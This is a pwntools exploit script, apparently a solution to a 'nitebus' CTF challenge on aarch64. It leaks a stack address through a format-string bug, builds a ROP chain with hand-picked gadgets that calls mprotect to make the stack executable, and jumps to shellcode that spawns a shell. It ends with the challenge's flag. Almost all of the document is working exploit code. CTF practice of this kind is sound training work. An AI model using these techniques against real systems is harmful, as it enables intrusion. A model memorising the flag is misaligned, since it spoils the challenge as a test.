from pwn import *

context.arch = 'aarch64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./nitebus', '''
    b *0x4008a0
    continue
''')

# p = remote('nitebus.chals.nitectf25.live', 1337, ssl=True)

def diagnostics(data):
    packet = p8(0x01)+p8(0x08)+p16(0)+data
    p.sendafter(b"[*] Waiting for nitebus packet...\n", packet)
    p.recvuntil(b"[DIAGNOSTICS] ")

def upload_control_program(data):
    packet = p8(0x01)+p8(0x42)+p16(0x200)
    p.sendafter(b"[*] Waiting for nitebus packet...\n", packet)
    p.sendafter(b"[*] Enter program data: ", data)

# apt install binutils-aarch64-linux-gnu

# 1. leak input buffer address through fmtstr
diagnostics(b'%6$p')
input_buffer_addr = int(p.recv(14), 16)+0x120
log.info(f"input buffer address: {hex(input_buffer_addr)}")

# 2. ROP with special gadgets to trigger mprotect to make stack region executable and jump to shellcode on stack
FAKE_X29 = 0x492800
EXEC_START_ADDR = input_buffer_addr&~0xfff
LIBC_MPROTECT = 0x417680
LIBC_MPROTECT_ADDR = input_buffer_addr+0xa0
SHELLCODE_ADDR = input_buffer_addr

GADGET_1 = 0x40e984  # 0x000000000040e984: ldp x19, x20, [sp, #0x10]; ldp x21, x22, [sp, #0x20]; ldp x23, x24, [sp, #0x30]; ldp x25, x26, [sp, #0x40]; ldp x29, x30, [sp], #0x50; ret;
GADGET_2 = 0x4409a8  # 0x00000000004409a8: mov x2, x24; add x1, x25, #0x10; mov w7, #0; mov w6, #0; blr x21;
GADGET_3 = 0x409730  # 0x0000000000409730: ldr x3, [x20, #0x70]; mov x0, x19; blr x3; 

payload = asm(shellcraft.sh()).ljust(0x90, b'\x00')+p64(FAKE_X29)+p64(GADGET_1)
payload += p64(LIBC_MPROTECT)+b'\x00'*0x18+p64(FAKE_X29)+p64(GADGET_2)+p64(EXEC_START_ADDR)+p64(LIBC_MPROTECT_ADDR-0x70)+p64(GADGET_3)+cyclic(0x10)+p64(7)+p64(0x1000-0x10)+cyclic(8)
payload += p64(FAKE_X29)+p64(SHELLCODE_ADDR)+cyclic(0x40)
upload_control_program(payload)

p.interactive()

# nite{th3_wh33l5_0n_th3_n1tbu5_g0_up_&_d0wn_4ll_thru_th3_t0wn}